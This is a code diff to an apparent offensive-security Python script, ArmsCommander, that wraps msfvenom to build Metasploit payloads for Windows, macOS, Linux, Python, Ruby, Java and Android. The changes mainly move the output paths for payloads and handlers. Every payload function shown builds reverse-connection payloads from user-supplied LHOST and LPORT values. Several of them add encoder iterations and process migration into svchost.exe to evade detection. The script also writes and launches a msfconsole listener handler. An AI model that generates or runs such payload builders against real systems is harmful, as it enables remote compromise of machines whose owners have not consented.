@@ -97,6 +97,8 @@ encoder_Dict = {
     '39': 'x86/unicode_upper'
 }
 
+payload_dir = '/root/ArmsCommander/payloads/'
+
 def test_Encoder_Effectiveness():
 
     payload_to_test = str(raw_input("Enter the payload you want to test: "))
@@ -136,6 +138,7 @@ def Windows_INLINE():
             payload_Set = opt_Dict[opt_Choice]
             user_input = payload_Parameters.from_input()
             bad_Bytes = "x00"
+            payload_file = payload_dir + user_input.output_payload
             cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                 payload_Set,
                 user_input.LHOST,
@@ -144,18 +147,18 @@ def Windows_INLINE():
                 user_input.encoder_iterations,
                 bad_Bytes,
                 user_input.output_format,
-                user_input.output_payload
+                payload_file
             )
             print colored(cmd_String,'red','on_white')
             os.system(cmd_String)
 
             # generate a handler file
             print 'Creating handler directory and generating handler file'
-            os.system('mkdir /root/ArmsCommander/handler')
-            # handler_directory = '/root/ArmsCommander/handler/'
+            # 
+            # handler_directory = '/root/ArmsCommander/payloads/'
             # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
             # handler_fullpath = handler_directory + handler_filename
-            handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+            handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
             # write proper parameters to handler file
             print 'Writing to handler file'
@@ -171,7 +174,7 @@ def Windows_INLINE():
             handler.write('\nexploit -j -z')
 
             # Inform user where the handler file is stored
-            print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+            print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
             print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
         else:
             print colored('You have entered a invalid option','red','on_white')
@@ -201,6 +204,7 @@ def Windows_STAGED():
             print colored('Please answer the following questions','red','on_white')
             payload_Set = opt_Dict[opt_Choice]
             user_input = payload_Parameters.from_input()
+            payload_file = payload_dir + user_input.output_payload
             bad_Bytes = "x00"
             cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                 payload_Set,
@@ -210,17 +214,17 @@ def Windows_STAGED():
                 user_input.encoder_iterations,
                 bad_Bytes,
                 user_input.output_format,
-                user_input.output_payload
+                payload_file
             )
             print colored(cmd_String,'red','on_white')
             os.system(cmd_String)
             # generate a handler file
             print 'Creating handler directory and generating handler file'
-            os.system('mkdir /root/ArmsCommander/handler')
-            # handler_directory = '/root/ArmsCommander/handler/'
+            # 
+            # handler_directory = '/root/ArmsCommander/payloads/'
             # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
             # handler_fullpath = handler_directory + handler_filename
-            handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+            handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
             # write proper parameters to handler file
             print 'Writing to handler file'
@@ -236,7 +240,7 @@ def Windows_STAGED():
             handler.write('\nexploit -j -z')
 
             # Inform user where the handler file is stored
-            print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+            print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
             print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
         else:
@@ -291,6 +295,7 @@ def OSX_PPC():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -299,17 +304,17 @@ def OSX_PPC():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -325,7 +330,7 @@ def OSX_PPC():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
 
@@ -356,6 +361,8 @@ def OSX_x86():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -364,17 +371,17 @@ def OSX_x86():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -390,7 +397,7 @@ def OSX_x86():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -443,6 +450,8 @@ def Linux_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -451,17 +460,17 @@ def Linux_STAGED():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -477,7 +486,7 @@ def Linux_STAGED():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -517,6 +526,8 @@ def Python_INLINE():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         # cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
         #     payload_Set,
         #     user_input.LHOST,
@@ -533,17 +544,17 @@ def Python_INLINE():
             user_input.LHOST,
             user_input.LPORT,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -559,7 +570,7 @@ def Python_INLINE():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -589,22 +600,24 @@ def Python_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
             payload_Set,
             user_input.LHOST,
             user_input.LPORT,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -620,7 +633,7 @@ def Python_STAGED():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -679,6 +692,8 @@ def Ruby_INLINE():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -687,17 +702,17 @@ def Ruby_INLINE():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -713,7 +728,7 @@ def Ruby_INLINE():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -752,6 +767,8 @@ def Java_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -760,17 +777,17 @@ def Java_STAGED():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -786,7 +803,7 @@ def Java_STAGED():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -822,6 +839,8 @@ def Android_INLINE():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -830,17 +849,17 @@ def Android_INLINE():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -856,7 +875,7 @@ def Android_INLINE():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -885,6 +904,8 @@ def Android_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
+        payload_file = payload_dir + user_input.output_payload
+
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -893,17 +914,17 @@ def Android_STAGED():
             user_input.encoder_iterations,
             bad_Bytes,
             user_input.output_format,
-            user_input.output_payload
+            payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        os.system('mkdir /root/ArmsCommander/handler')
-        # handler_directory = '/root/ArmsCommander/handler/'
+        
+        # handler_directory = '/root/ArmsCommander/payloads/'
         # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
         # handler_fullpath = handler_directory + handler_filename
-        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         print 'Writing to handler file'
@@ -919,7 +940,7 @@ def Android_STAGED():
         handler.write('\nexploit -j -z')
 
         # Inform user where the handler file is stored
-        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print colored('Your handler file is located at /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
         print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
@@ -957,7 +978,7 @@ def launch_msfconsole_handler():
     # os.system('service metasploit start') # Deprecated Command apparently
     os.system('msfdb init')
     os.system('msfdb start')
-    os.system('msfconsole -r /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc')
+    os.system('msfconsole -r /root/ArmsCommander/payloads/EasyPeasey_payload_handler.rc')
     os.system('db_status')
     return
 
